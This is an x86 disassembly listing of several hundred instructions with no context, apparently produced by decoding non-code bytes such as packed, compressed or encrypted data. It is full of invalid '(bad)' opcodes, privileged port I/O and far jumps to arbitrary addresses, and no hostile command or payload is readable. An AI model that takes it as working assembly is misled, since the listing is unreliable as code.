  40a9f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9f9:	sub    eax,0xde58c211
  40a9fe:	test   edi,edi
  40aa00:	mov    eax,DWORD PTR [ecx-0x37]
  40aa03:	dec    ebx
  40aa04:	push   ebx
  40aa05:	fwait
  40aa06:	jmp    0x12a98090
  40aa0b:	sbb    edi,DWORD PTR [eax]
  40aa0d:	xor    al,0x89
  40aa0f:	and    DWORD PTR [esi+edi*2-0x68],ebp
  40aa13:	out    dx,al
  40aa14:	sar    esp,cl
  40aa16:	xchg   esp,eax
  40aa17:	(bad)  
  40aa18:	lahf   
  40aa19:	rol    DWORD PTR ds:0x71d419a6,cl
  40aa1f:	lods   al,BYTE PTR ds:[esi]
  40aa20:	xor    BYTE PTR [eax+0x595c1bfd],cl
  40aa26:	out    0x45,al
  40aa28:	add    BYTE PTR [eax+0x15],ch
  40aa2b:	cmp    al,0xf0
  40aa2d:	int3   
  40aa2e:	mov    ebp,0x8842c8f6
  40aa33:	aas    
  40aa34:	push   esi
  40aa35:	cs sbb eax,0x4c2d9360
  40aa3b:	in     eax,dx
  40aa3c:	fimul  WORD PTR [edi]
  40aa3e:	mov    ebp,0x70fab5c1
  40aa43:	xor    edi,ebx
  40aa45:	imul   BYTE PTR [edx+ecx*4+0x7eafa771]
  40aa4c:	push   ecx
  40aa4d:	push   eax
  40aa4e:	dec    esp
  40aa4f:	aad    0xea
  40aa51:	ret    
  40aa52:	sub    eax,0xdd877126
  40aa57:	ja     0x40aaab
  40aa59:	loope  0x40a9f5
  40aa5b:	jae    0x40aa1e
  40aa5d:	(bad)  
  40aa5e:	and    DWORD PTR ds:0x3fa4f480,edx
  40aa64:	xor    DWORD PTR [edx+eiz*2],esp
  40aa67:	ds mov ah,0x2c
  40aa6a:	or     ch,BYTE PTR [edx+0x44c4d09a]
  40aa70:	jae    0x40aa3e
  40aa72:	rol    DWORD PTR [edx],cl
  40aa74:	das    
  40aa75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa76:	jge    0x40aacc
  40aa78:	xchg   DWORD PTR [eax],ebx
  40aa7a:	loop   0x40aa0d
  40aa7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa7d:	jo     0xbafb3884
  40aa83:	inc    ecx
  40aa84:	arpl   WORD PTR [edi],dx
  40aa86:	in     al,dx
  40aa87:	icebp  
  40aa88:	mov    bl,0xa1
  40aa8a:	ja     0x40aa48
  40aa8c:	mov    bh,0xd0
  40aa8e:	rep ins DWORD PTR es:[edi],dx
  40aa90:	not    BYTE PTR [ecx]
  40aa92:	lock and al,0x19
  40aa95:	outs   dx,DWORD PTR ds:[esi]
  40aa96:	loop   0x40aaa0
  40aa98:	add    eax,0xffffffc9
  40aa9b:	lock xchg edi,eax
  40aa9d:	dec    edx
  40aa9e:	and    ecx,DWORD PTR [ecx]
  40aaa0:	inc    ecx
  40aaa1:	lods   eax,DWORD PTR ds:[esi]
  40aaa2:	inc    ebp
  40aaa3:	jbe    0x40aa41
  40aaa5:	push   esi
  40aaa6:	cld    
  40aaa7:	push   ss
  40aaa8:	push   0x27
  40aaaa:	push   ds
  40aaab:	add    bh,BYTE PTR [edi+edx*2]
  40aaae:	adc    al,0x55
  40aab0:	or     ebx,edi
  40aab2:	mov    es,eax
  40aab4:	sub    ah,BYTE PTR [ebx]
  40aab6:	jle    0x40aafc
  40aab8:	dec    ebp
  40aab9:	sub    eax,0x64af7a6
  40aabe:	mov    ch,0xd8
  40aac0:	jl     0x40aa86
  40aac2:	mov    ebx,edi
  40aac4:	inc    eax
  40aac5:	jg     0x40ab02
  40aac7:	outs   dx,BYTE PTR ds:[esi]
  40aac8:	in     al,dx
  40aac9:	gs jg  0x40aadc
  40aacc:	pop    ss
  40aacd:	rcr    DWORD PTR [eax],cl
  40aacf:	mov    dl,0x1d
  40aad1:	cli    
  40aad2:	push   edi
  40aad3:	mov    DWORD PTR [esi],esi
  40aad5:	sti    
  40aad6:	(bad)  
  40aad7:	dec    ebp
  40aad8:	inc    edi
  40aad9:	jecxz  0x40ab22
  40aadb:	test   edi,ebp
  40aadd:	cmp    al,0x63
  40aadf:	pop    es
  40aae0:	cmp    ebx,DWORD PTR [ebx+0x62]
  40aae3:	mov    cl,0xbb
  40aae5:	gs sub eax,0x1c2ecb56
  40aaeb:	xchg   ah,ah
  40aaed:	jp     0x40aad2
  40aaef:	xchg   BYTE PTR [esi],dl
  40aaf1:	xchg   ecx,eax
  40aaf2:	cwde   
  40aaf3:	fs gs std 
  40aaf6:	call   0xd6d6:0x8cde7c08
  40aafd:	fadd   st,st(6)
  40aaff:	mov    ebx,0xe471ebe8
  40ab04:	mov    WORD PTR [ebp-0x4371b627],gs
  40ab0a:	pop    ecx
  40ab0b:	push   ebx
  40ab0c:	xlat   BYTE PTR ds:[ebx]
  40ab0d:	loop   0x40aace
  40ab0f:	test   eax,0x69b852f3
  40ab14:	gs in  al,0xe4
  40ab17:	ins    DWORD PTR es:[edi],dx
  40ab18:	outs   dx,BYTE PTR ds:[esi]
  40ab19:	inc    esp
  40ab1a:	mov    esp,0xe2fc4500
  40ab1f:	push   ds
  40ab20:	cli    
  40ab21:	dec    edx
  40ab22:	push   eax
  40ab23:	lds    ebp,FWORD PTR [ecx+0x7c]
  40ab26:	and    eax,0xdc594f18
  40ab2b:	xor    BYTE PTR [eax+0x6],bl
  40ab2e:	pop    ss
  40ab2f:	aaa    
  40ab30:	loop   0x40ab99
  40ab32:	jp     0x40aab7
  40ab34:	ror    DWORD PTR [ebx-0x4be58a12],0xbd
  40ab3b:	xor    eax,0x75182236
  40ab40:	xchg   edi,eax
  40ab41:	nop
  40ab42:	shl    BYTE PTR [ebx],1
  40ab44:	inc    edi
  40ab45:	int    0x9c
  40ab47:	push   ecx
  40ab48:	fwait
  40ab49:	repz in eax,dx
  40ab4b:	call   0x7afa29e7
  40ab50:	out    dx,eax
  40ab51:	mov    ecx,0x5c26571e
  40ab56:	xchg   edi,eax
  40ab57:	and    DWORD PTR [ebx],0xffffffe1
  40ab5a:	add    al,0x29
  40ab5c:	inc    esi
  40ab5d:	(bad)  
  40ab5e:	mov    edi,0x81d2a18c
  40ab63:	mov    edi,0xe6239b72
  40ab68:	pop    esp
  40ab69:	out    0x51,al
  40ab6b:	add    al,0x5f
  40ab6d:	das    
  40ab6e:	pop    ds
  40ab6f:	fsub   QWORD PTR [ebx+ebx*1]
  40ab72:	adc    DWORD PTR ds:0x20fa6dd5,esp
  40ab78:	and    ecx,esp
  40ab7a:	mov    ds:0x6bc1b0c9,eax
  40ab7f:	ins    DWORD PTR es:[edi],dx
  40ab80:	(bad)  
  40ab82:	stc    
  40ab83:	arpl   dx,cx
  40ab85:	pop    edx
  40ab86:	loope  0x40abbb
  40ab88:	aam    0x52
  40ab8a:	sbb    DWORD PTR [ecx],edx
  40ab8c:	adc    bh,bl
  40ab8e:	xchg   esi,eax
  40ab8f:	das    
  40ab90:	mov    bl,BYTE PTR [ecx+0xaf6c58f]
  40ab96:	out    0xf1,al
  40ab98:	(bad)  
  40ab99:	out    0xcc,al
  40ab9b:	mov    al,ds:0xde66b377
  40aba0:	fadd   st,st(2)
  40aba2:	jnp    0x40abbf
  40aba4:	jmp    0xd5e4db9f
  40aba9:	or     eax,0xf9fed01b
  40abae:	fwait
  40abaf:	xchg   esp,eax
  40abb0:	lods   al,BYTE PTR ds:[esi]
  40abb1:	shl    ah,cl
  40abb3:	lahf   
  40abb4:	lds    edi,FWORD PTR ds:0xf2de
  40abb9:	into   
  40abba:	fstp   QWORD PTR [eax+0x76]
  40abbd:	hlt    
  40abbe:	stos   BYTE PTR es:[edi],al
  40abbf:	sbb    eax,0x869bd1ac
  40abc4:	xchg   ebx,eax
  40abc5:	dec    ecx
  40abc6:	rol    BYTE PTR [edi+edx*4],cl
  40abc9:	inc    BYTE PTR [eax-0x69]
  40abcc:	in     al,dx
  40abcd:	clc    
  40abce:	inc    eax
  40abcf:	fs cdq 
  40abd1:	push   cs
  40abd2:	lds    ebx,FWORD PTR [esi-0x29]
  40abd5:	ds shr eax,0xa3
  40abd9:	aad    0x4a
  40abdb:	in     al,dx
  40abdc:	xchg   BYTE PTR [eax+eax*2],al
  40abdf:	je     0x40ac46
  40abe1:	sub    esp,DWORD PTR [ecx]
  40abe3:	out    0x3d,al
  40abe5:	add    ebp,DWORD PTR [ecx-0x7654810f]
  40abeb:	call   0xadb460bd
  40abf0:	jecxz  0x40ab73
  40abf2:	aam    0x25
  40abf4:	inc    esi
  40abf5:	or     ebx,eax
  40abf7:	out    0x8a,eax
  40abf9:	invd   
  40abfb:	add    al,0x9b
  40abfd:	jns    0x40ac6f
  40abff:	sbb    ah,BYTE PTR [edi+0x1c]
  40ac02:	ret    
  40ac03:	in     eax,0x64
  40ac05:	push   0x5f08efc6
  40ac0a:	(bad)  [edi]
  40ac0c:	xchg   DWORD PTR ss:[edx-0xd],edx
  40ac10:	jmp    0x9408:0x16ed8b8c
  40ac17:	pop    ebp
  40ac18:	pop    edx
  40ac19:	lods   al,BYTE PTR ds:[esi]
  40ac1a:	push   esp
  40ac1b:	cmp    al,0x33
  40ac1d:	cmp    eax,0x21633876
  40ac22:	ins    DWORD PTR es:[edi],dx
  40ac23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac24:	ret    0x8f17
  40ac27:	sub    eax,0x63b7cf4e
  40ac2c:	pop    eax
  40ac2d:	cmc    
  40ac2e:	jmp    0x40ac25
  40ac30:	lea    edi,[ecx-0x2a09538b]
  40ac36:	test   al,0x81
  40ac38:	popf   
  40ac39:	sbb    eax,0x955672e4
  40ac3e:	push   ecx
  40ac3f:	mov    WORD PTR [ecx+eax*4-0xf85210],fs
  40ac46:	bound  ecx,QWORD PTR [ecx+0x59]
  40ac49:	pop    eax
  40ac4a:	mov    ebp,0x3261250
  40ac4f:	jge    0x40ac3f
  40ac51:	ror    BYTE PTR [eax],1
  40ac53:	outs   dx,BYTE PTR ds:[esi]
  40ac54:	sbb    bl,BYTE PTR [ebx-0x4f]
  40ac57:	add    al,0x57
  40ac59:	outs   dx,BYTE PTR ds:[esi]
  40ac5a:	and    dl,BYTE PTR [ebp-0x6712e96b]
  40ac60:	dec    ecx
  40ac61:	lods   eax,DWORD PTR ds:[esi]
  40ac62:	mov    ecx,0x2ca6b6c6
  40ac67:	fnop   
  40ac69:	xchg   esp,eax
  40ac6a:	jns    0x40ac5e
  40ac6c:	mov    ds:0xf227b9c3,eax
  40ac71:	sti    
  40ac72:	int3   
  40ac73:	aas    
  40ac74:	pusha  
  40ac75:	and    bl,BYTE PTR [ebx+0x2ab908c4]
  40ac7b:	retf   
  40ac7c:	xchg   ebp,eax
  40ac7d:	scas   eax,DWORD PTR es:[edi]
  40ac7e:	and    ah,bh
  40ac80:	(bad)  
  40ac81:	sub    edi,DWORD PTR [ecx-0x79]
  40ac84:	retf   
  40ac85:	dec    eax
  40ac86:	loopne 0x40aca5
  40ac88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac89:	sub    BYTE PTR [ecx+0x0],bl
  40ac8c:	bound  esi,QWORD PTR [edi+eiz*1-0x69b8ded9]
  40ac93:	cld    
  40ac94:	cmp    al,0x53
  40ac96:	mov    ebp,0x4e38c623
  40ac9b:	cmc    
  40ac9c:	out    0x47,al
  40ac9e:	xor    eax,0x77ca61f4
  40aca3:	cmp    BYTE PTR [edi+0x10],al
  40aca6:	xchg   edx,eax
  40aca7:	mov    ah,0xdf
  40aca9:	cld    
  40acaa:	push   ss
  40acab:	sar    BYTE PTR [ecx+0x58],cl
  40acae:	adc    ebx,ebx
  40acb0:	mov    WORD PTR [eax-0x6adc77b3],es
  40acb6:	ret    
  40acb7:	jge    0x40ad12
  40acb9:	clc    
  40acba:	xor    BYTE PTR [eax+0x1e57fba6],0x62
  40acc1:	mov    eax,ds:0xa21ad534
  40acc6:	xchg   edx,eax
  40acc7:	adc    eax,0xc0683d1a
  40accc:	out    dx,al
  40accd:	gs mov bl,0x7c
  40acd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd1:	test   al,0xec
  40acd3:	idiv   ebx
  40acd5:	mov    esi,esp
  40acd7:	aas    
  40acd8:	sbb    dl,BYTE PTR [eax+0x571be848]
  40acde:	mov    ch,BYTE PTR [edi-0x34841bef]
  40ace4:	mov    dl,0xb4
  40ace6:	or     eax,0xee8b49c6
  40aceb:	icebp  
  40acec:	xor    ebx,edi
  40acee:	aam    0x39
  40acf0:	mov    ecx,0x98a7e966
  40acf5:	cmp    BYTE PTR [edi-0x1f],dl
  40acf8:	mov    ch,0x4b
  40acfa:	jp     0x40ad22
  40acfc:	pop    ecx
  40acfd:	call   0x6dfdd929
  40ad02:	les    ebp,FWORD PTR [edx]
  40ad04:	sub    DWORD PTR [edi+0xd],ebp
  40ad07:	cmp    bl,ch
  40ad09:	sub    edi,DWORD PTR [eax]
  40ad0b:	pop    ds
  40ad0c:	cmp    dl,BYTE PTR [eax]
  40ad0e:	add    BYTE PTR [esi-0x2d],dh
  40ad11:	cmp    ecx,DWORD PTR [edx-0x35]
  40ad14:	push   0x4b
  40ad16:	test   DWORD PTR [ecx-0x5d],ebx
  40ad19:	addr16 mov edx,0x228a9358
  40ad1f:	dec    ebx
  40ad20:	in     eax,dx
  40ad21:	mov    al,ds:0xd8caded8
  40ad26:	stos   BYTE PTR es:[edi],al
  40ad27:	outs   dx,BYTE PTR ds:[esi]
  40ad28:	kunpckbw k5,k5,k1
  40ad2c:	pop    edx
  40ad2d:	add    ebx,DWORD PTR [ebx]
  40ad2f:	retf   
  40ad30:	xor    ecx,ecx
  40ad32:	mov    ah,0x74
  40ad34:	add    DWORD PTR [esi+0x20b25c8b],0x12
  40ad3b:	test   al,0xc5
  40ad3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad3e:	dec    esp
  40ad3f:	add    eax,0xb046bc98
  40ad44:	(bad)  
  40ad45:	adc    BYTE PTR [ebx-0x10922a88],dl
  40ad4b:	in     eax,0x92
  40ad4d:	icebp  
  40ad4e:	(bad)  
  40ad4f:	sub    al,0x86
  40ad51:	jge    0x40ad6c
  40ad53:	sbb    ebx,DWORD PTR [ebp+0x4]
  40ad56:	sbb    DWORD PTR [edx+0x7135f035],edx
  40ad5c:	scas   eax,DWORD PTR es:[edi]
  40ad5d:	cld    
  40ad5e:	ja     0x40ad01
  40ad60:	or     BYTE PTR [esp+ecx*1],cl
  40ad63:	jb     0x40ad06
  40ad65:	aaa    
  40ad66:	jmp    DWORD PTR [ebp+eax*2-0x26acc82e]
  40ad6d:	jmp    0xfff44dca
  40ad72:	xchg   ebp,eax
  40ad73:	data16 sbb al,0xf9
  40ad76:	sti    
  40ad77:	xchg   esi,eax
  40ad78:	pusha  
  40ad79:	sub    edx,DWORD PTR [esi]
  40ad7b:	out    0xf3,al
  40ad7d:	sub    BYTE PTR [edi-0x30a4e452],bl
  40ad83:	aam    0x29
  40ad85:	ret    0xdcda
  40ad88:	xor    cl,BYTE PTR [esi-0x5ac4b02f]
  40ad8e:	mov    ebx,0x3e4a8f5c
  40ad93:	sbb    edx,DWORD PTR [esi+0x78]
  40ad96:	inc    ebx
  40ad97:	iret   
  40ad98:	jp     0x40adf7
  40ad9a:	shl    BYTE PTR [esi],0x8d
  40ad9d:	iret   
  40ad9e:	pop    ebp
  40ad9f:	cs push cs
  40ada1:	mov    esp,0x3d27b471
  40ada6:	xchg   ecx,eax
  40ada7:	lds    edx,FWORD PTR [ecx+0x7bd8c178]
  40adad:	push   es
  40adae:	stos   DWORD PTR es:[edi],eax
  40adaf:	pop    esi
  40adb0:	ss retf 0x64fe
  40adb4:	shr    BYTE PTR [ecx+edx*2+0x60],1
  40adb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adb9:	xor    bl,bh
  40adbb:	out    0xff,al
  40adbd:	lods   eax,DWORD PTR ds:[esi]
  40adbe:	fdivr  QWORD PTR [eax]
  40adc0:	retf   
  40adc1:	jnp    0x40adfa
  40adc3:	aad    0xc
  40adc5:	frstor [ecx]
  40adc7:	inc    esi
  40adc8:	loope  0x40adad
  40adca:	(bad)  
  40adcb:	inc    edx
  40adcc:	(bad)  
  40adcd:	ds (bad) 
  40adcf:	cmc    
  40add0:	add    cl,bh
  40add2:	inc    esi
  40add3:	mov    eax,0xe7c87e09
  40add8:	inc    ebx
  40add9:	jo     0x40ae31
  40addb:	and    eax,0xf5c49c96
  40ade0:	in     al,dx
  40ade1:	pushf  
  40ade2:	mov    esp,0x28d47957
  40ade7:	push   0x77467ea4
  40adec:	cld    
  40aded:	mov    ebp,0x8784fcdd
  40adf2:	std    
  40adf3:	repz retf 
  40adf5:	int3   
  40adf6:	js     0x40ada1
  40adf8:	out    dx,eax
  40adf9:	fidivr WORD PTR [ebp-0xf9eb7e0]
  40adff:	inc    esi
  40ae00:	jne    0x40ad9b
  40ae02:	sub    DWORD PTR [esi],0x591271d
  40ae08:	jmp    0x3beb8d51
  40ae0d:	(bad)  
  40ae0e:	cwde   
  40ae0f:	pusha  
  40ae10:	mov    ebx,0x6c88016f
  40ae15:	and    DWORD PTR [eax-0x4a681406],ecx
  40ae1b:	test   al,0x7f
  40ae1d:	cmp    DWORD PTR [eax],ecx
  40ae1f:	jl     0x40ae31
  40ae21:	jp     0x40adb7
  40ae23:	shl    BYTE PTR [ebx],1
  40ae25:	add    dh,BYTE PTR ds:0xb0658f43
  40ae2b:	mov    BYTE PTR es:[ecx-0x50],dl
  40ae2f:	xchg   DWORD PTR [eax-0x5caa6c4d],ecx
  40ae35:	cmp    DWORD PTR [eax],ecx
  40ae37:	xor    al,0xaa
  40ae39:	push   ds
  40ae3a:	clc    
  40ae3b:	jb     0x40addb
  40ae3d:	test   ch,cl
  40ae3f:	dec    esp
  40ae40:	jl     0x40ae86
  40ae42:	inc    esi
  40ae43:	call   0x2b18:0xa3e8e4c5
  40ae4a:	mov    ecx,0xd0e409bb
  40ae4f:	sub    dl,bh
  40ae51:	pushf  
  40ae52:	shr    DWORD PTR [ecx],1
  40ae54:	xor    eax,0x464d250e
  40ae59:	adc    ebp,DWORD PTR [edx+0x6a]
  40ae5c:	and    eax,0x46eae175
  40ae61:	cmp    ebx,ecx
  40ae63:	out    dx,eax
  40ae64:	stos   DWORD PTR es:[edi],eax
  40ae65:	fst    st(3)
  40ae67:	shl    edx,1
  40ae69:	addr16 into 
  40ae6b:	pop    ebp
  40ae6c:	inc    ecx
  40ae6d:	pushf  
  40ae6e:	and    ch,BYTE PTR ds:0x94ac1427
  40ae74:	js     0x40ae1f
  40ae76:	je     0x40aec4
  40ae78:	fld    DWORD PTR [edi-0x4]
  40ae7b:	dec    ecx
  40ae7c:	out    dx,al
  40ae7d:	jmp    FWORD PTR [edx]
  40ae7f:	push   edx
  40ae80:	and    DWORD PTR [edi],ebx
  40ae82:	mov    eax,0xe871b367
  40ae87:	add    cl,dl
  40ae89:	push   ebp
  40ae8a:	mov    ecx,0xca33d86b
  40ae8f:	mov    bh,0xf4
  40ae91:	aam    0x12
  40ae93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae94:	test   cl,bh
  40ae96:	repz icebp 
  40ae98:	loope  0x40ae5a
  40ae9a:	inc    eax
  40ae9b:	pushf  
  40ae9c:	xchg   BYTE PTR [esi],al
  40ae9e:	lods   eax,DWORD PTR ds:[esi]
  40ae9f:	mov    bl,0x7b
  40aea1:	clc    
  40aea2:	in     eax,0x33
  40aea4:	(bad)  
  40aea5:	xor    eax,ebp
  40aea7:	neg    DWORD PTR fs:[esi+0x658032fb]
  40aeae:	adc    esi,DWORD PTR [ebp+0x25]
  40aeb1:	adc    DWORD PTR [edi],0xffffffb4
  40aeb4:	xor    cl,BYTE PTR [esi+0x7f]
  40aeb7:	and    DWORD PTR [eax],esp
  40aeb9:	mov    esp,0xfa335310
  40aebe:	inc    edx
  40aebf:	(bad)  
  40aec0:	mov    ds:0x5380fe76,al
  40aec5:	in     al,dx
  40aec6:	(bad)  
  40aec8:	in     eax,dx
  40aec9:	pusha  
  40aeca:	cmp    dl,BYTE PTR [ebp+0x21ce6932]
  40aed0:	jmp    0x40aef8
  40aed2:	mov    DWORD PTR [ebp+ebp*1-0x2ed45563],0x83663f4f
  40aedd:	dec    edi
  40aede:	daa    
  40aedf:	pop    es
  40aee0:	mov    al,BYTE PTR [esi]
  40aee2:	and    edx,DWORD PTR ds:0xc520dab6
  40aee8:	jp     0x40aee8
  40aeea:	and    DWORD PTR [eax+0x5e],ecx
  40aeed:	dec    esp
  40aeee:	push   es
  40aeef:	dec    ecx
  40aef0:	loope  0x40aefc
  40aef2:	imul   ecx,DWORD PTR ds:[edi-0x1d],0x3de81c65
  40aefa:	fisub  DWORD PTR [eax-0xe646855]
  40af00:	and    ebx,DWORD PTR [ebx+ecx*2+0x79448f8e]
  40af07:	outs   dx,DWORD PTR ds:[esi]
  40af08:	sbb    DWORD PTR [ecx],esi
  40af0a:	xchg   ebp,eax
  40af0b:	out    0xc9,al
  40af0d:	aad    0xd8
  40af0f:	xor    al,0xa1
  40af11:	mov    ds:0x6cb65a6,eax
  40af16:	call   0xcdf2e653
  40af1b:	ror    BYTE PTR [edx+0x30],cl
  40af1e:	push   ebp
  40af1f:	mov    al,0x75
  40af21:	fnstsw WORD PTR [ebp-0x14]
  40af24:	mov    ch,0x4d
  40af26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af27:	(bad)  
  40af28:	adc    BYTE PTR [edi+0x19ef4615],ah
  40af2e:	test   DWORD PTR [esi-0x4762113b],ecx
  40af34:	dec    ecx
  40af35:	arpl   WORD PTR [esi-0x632a7967],si
  40af3b:	ror    dl,1
  40af3d:	or     bh,dl
  40af3f:	ficom  DWORD PTR [ebx]
  40af41:	clc    
  40af42:	sub    dl,bl
  40af44:	std    
  40af45:	js     0x40af1c
  40af47:	pushf  
  40af48:	and    al,0x7f
  40af4a:	push   0x75
  40af4c:	jno    0x40af07
  40af4e:	int    0xa3
  40af50:	cli    
  40af51:	call   0xdf23191e
  40af56:	sbb    edi,0xdded403b
  40af5c:	pop    es
  40af5d:	repz fnstenv [edx-0x44]
  40af61:	jl     0x40af87
  40af63:	fsubr  QWORD PTR [eax]
  40af65:	dec    esp
  40af66:	hlt    
  40af67:	and    eax,0x747e7224
  40af6c:	mov    ch,BYTE PTR [ebx-0xb4d5630]
  40af72:	retf   0x221c
  40af75:	test   BYTE PTR [ebx-0x1b],ch
  40af78:	(bad)  
  40af79:	mov    ds:0x47a39e74,eax
  40af7e:	addr16 jmp 0xcc8c:0x266323c2
  40af86:	push   0x347a6b99
  40af8b:	out    dx,al
  40af8c:	adc    al,0xba
  40af8e:	(bad)  
  40af8f:	out    0x45,al
  40af91:	mov    eax,0x6d35ea5f
  40af96:	sub    DWORD PTR [edx],edi
  40af98:	test   BYTE PTR [esi],cl
  40af9a:	mov    eax,0xe91fb0b0
  40af9f:	leave  
  40afa0:	push   ebx
  40afa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afa2:	std    
  40afa3:	ins    DWORD PTR es:[edi],dx
  40afa4:	xchg   edi,ebx
  40afa6:	imul   edi,DWORD PTR [ebp+0x7bbf5a0],0x77
  40afad:	add    eax,0xc9c25e9
  40afb2:	and    DWORD PTR [eax-0x5dc5300],0x12
  40afb9:	mov    bl,BYTE PTR [ecx-0x63de5dae]
  40afbf:	pop    ebp
  40afc0:	leave  
  40afc1:	lods   eax,DWORD PTR ds:[esi]
  40afc2:	out    dx,al
  40afc3:	sbb    al,0x24
  40afc5:	ret    0x4a93
  40afc8:	(bad)  
  40afc9:	aas    
  40afca:	push   ds
  40afcb:	clc    
  40afcc:	stos   DWORD PTR es:[edi],eax
  40afcd:	mov    fs,WORD PTR [esi-0x39]
  40afd0:	dec    ecx
  40afd1:	(bad)  
  40afd3:	sti    
  40afd4:	xchg   edx,eax
  40afd5:	pusha  
  40afd6:	ss jo  0x40aff0
  40afd9:	push   esi
  40afda:	push   0xbac465cd
  40afdf:	out    dx,eax
  40afe0:	mov    cl,0x4b
  40afe2:	std    
  40afe3:	adc    al,0x76
  40afe5:	push   0x4f
  40afe7:	ret    0x239d
  40afea:	rol    BYTE PTR [esp+ebp*1],1
  40afed:	mov    BYTE PTR [edi+0x2f],0x3d
  40aff1:	xchg   ecx,eax
  40aff2:	mov    ch,0x10
  40aff4:	mov    eax,edx
  40aff6:	pop    es
  40aff7:	jp     0x40afdb
  40aff9:	mov    bh,0xe0
  40affb:	(bad)  
  40affc:	mov    esp,0x970b1e82
  40b001:	dec    esi
  40b002:	popf   
  40b003:	pop    esi
  40b004:	scas   eax,DWORD PTR es:[edi]
  40b005:	inc    eax
  40b006:	adc    dl,BYTE PTR [eax+0x26]
  40b009:	add    ch,BYTE PTR [edi-0x67]
  40b00c:	dec    ebx
  40b00d:	pop    esi
  40b00e:	std    
  40b00f:	ja     0x40affe
  40b011:	and    al,0x46
  40b013:	retf   
  40b014:	xor    eax,0xbc956658
  40b019:	push   es
  40b01a:	je     0x40b06d
  40b01c:	sub    al,0x5
  40b01e:	mov    dl,0x3c
  40b020:	xchg   ebx,eax
  40b021:	jge    0x40b085
  40b023:	hlt    
  40b024:	out    dx,al
  40b025:	xchg   ebp,eax
  40b026:	and    bl,BYTE PTR [ebx-0x7a]
  40b029:	shl    BYTE PTR [eax+0x16],0xe1
  40b02d:	in     eax,dx
  40b02e:	xor    eax,0xc822b2c1
  40b033:	ins    DWORD PTR es:[edi],dx
  40b034:	and    DWORD PTR [esi+0x33312aa9],esp
  40b03a:	cs push ebp
  40b03c:	es enter 0xb545,0xd8
  40b041:	retf   0x39f3
  40b044:	cmp    eax,0x1eb471fb
  40b049:	cmp    ch,BYTE PTR [esp+ebp*4]
  40b04c:	popa   
  40b04d:	xchg   DWORD PTR [edx],ebx
  40b04f:	lods   al,BYTE PTR ds:[esi]
  40b050:	push   ecx
  40b051:	mov    DWORD PTR [edi-0x3543482b],esi
  40b057:	fwait
  40b058:	xchg   edx,eax
  40b059:	test   BYTE PTR [edi-0x49b153ef],al
  40b05f:	mov    esi,0xe946f3d8
  40b064:	ss dec esi
  40b066:	dec    ecx
  40b067:	nop
  40b068:	cmp    BYTE PTR [ebx+0x59dfc80b],dl
  40b06e:	mov    cl,0x2f
  40b070:	mov    ah,0xe0
  40b072:	mov    eax,0xa86c5e1c
  40b077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b078:	gs sti 
  40b07a:	jecxz  0x40b0d5
  40b07c:	fimul  WORD PTR [ebx]
  40b07e:	add    eax,0xa5ef3e92
  40b083:	pop    ebp
  40b084:	fimul  WORD PTR [ebx+0x54]
  40b087:	xchg   edx,eax
  40b088:	xchg   ebx,eax
  40b089:	cli    
  40b08a:	popf   
  40b08b:	loopne 0x40b086
  40b08d:	pop    ebp
  40b08e:	pushf  
  40b08f:	add    DWORD PTR [edi],edi
  40b091:	sub    BYTE PTR [ebp+0x53],bl
  40b094:	xlat   BYTE PTR ds:[ebx]
  40b095:	rcr    BYTE PTR [edi+eiz*2-0x13],cl
  40b099:	sub    DWORD PTR [edx],ebx
  40b09b:	in     al,dx
  40b09c:	arpl   WORD PTR [ecx],bx
  40b09e:	add    BYTE PTR [ecx+0x42],ah
  40b0a1:	fs pop ax
  40b0a4:	sbb    BYTE PTR [ecx],dl
  40b0a6:	mov    WORD PTR [ebx+0x7892700d],gs
  40b0ac:	in     al,dx
  40b0ad:	add    eax,0x48dd829c
  40b0b2:	jecxz  0x40b035
  40b0b4:	rcl    DWORD PTR [ebx+0x4bbca23a],1
  40b0ba:	mov    ch,BYTE PTR [edx+eiz*8]
  40b0bd:	and    al,0xfc
  40b0bf:	push   ecx
  40b0c0:	mov    esp,0x3a14f186
  40b0c5:	les    ebp,FWORD PTR [ebx-0x10ca6f73]
  40b0cb:	push   0x77
  40b0cd:	ins    DWORD PTR es:[edi],dx
  40b0ce:	sub    dh,BYTE PTR [edx+0x1479c68e]
  40b0d4:	hlt    
  40b0d5:	add    al,BYTE PTR [ecx-0x42]
  40b0d8:	into   
  40b0d9:	xchg   DWORD PTR [edi+0x52a47892],eax
  40b0df:	imul   ebx,ebp,0x38
  40b0e2:	shl    dl,0x4e
  40b0e5:	out    dx,al
  40b0e6:	cmc    
  40b0e7:	mov    bl,0x9
  40b0e9:	mov    ds:0x2f17a1f4,eax
  40b0ee:	cmp    eax,0x22755ded
  40b0f3:	mov    ds:0xd73de3ee,al
  40b0f8:	add    esi,esi
  40b0fa:	leave  
  40b0fb:	mov    ebp,esp
  40b0fd:	lods   eax,DWORD PTR ds:[esi]
  40b0fe:	sub    esi,DWORD PTR [ebx]
  40b100:	pop    ds
  40b101:	jg     0x40b119
  40b103:	stc    
  40b104:	adc    esp,DWORD PTR [ecx+0x21]
  40b107:	(bad)  
  40b108:	cmp    al,0x9
  40b10a:	call   0x5f760437
  40b10f:	dec    ebp
  40b110:	icebp  
  40b111:	jmp    0xa41e87c5
  40b116:	inc    esp
  40b117:	cs stos DWORD PTR es:[edi],eax
  40b119:	xchg   esi,eax
  40b11a:	mov    edx,0xfef5c351
  40b11f:	lds    ecx,FWORD PTR [edx]
  40b121:	cmp    ah,BYTE PTR [edi-0x3057d28]
  40b127:	fcmove st,st(4)
  40b129:	pop    ds
  40b12a:	fs pop es
  40b12c:	mov    dl,0xc5
  40b12e:	(bad)  
  40b12f:	in     eax,dx
  40b130:	mov    ah,0x9d
  40b132:	dec    ebx
  40b133:	pop    esp
  40b134:	adc    ecx,DWORD PTR [esi+0x16]
  40b137:	jbe    0x40b1ae
